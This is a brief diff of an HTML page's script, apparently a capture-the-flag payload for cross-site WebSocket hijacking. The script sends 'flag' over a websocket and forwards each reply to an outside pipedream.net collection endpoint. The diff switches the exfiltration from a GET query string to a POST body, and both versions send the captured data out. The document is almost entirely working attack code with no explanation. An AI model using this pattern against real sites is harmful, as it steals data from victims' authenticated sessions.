@@ -11,7 +11,7 @@
       websocket.send("flag"); /
       }
     function handleReply(event) {
-      fetch('https://eoorkx698oqzcap.m.pipedream.net/?'+event.data, {mode: 'no-cors'})
+      fetch('https://eoorkx698oqzcap.m.pipedream.net', {method:'POST',mode:'no-cors',body:event.data})
     }
 </script>
 </html>
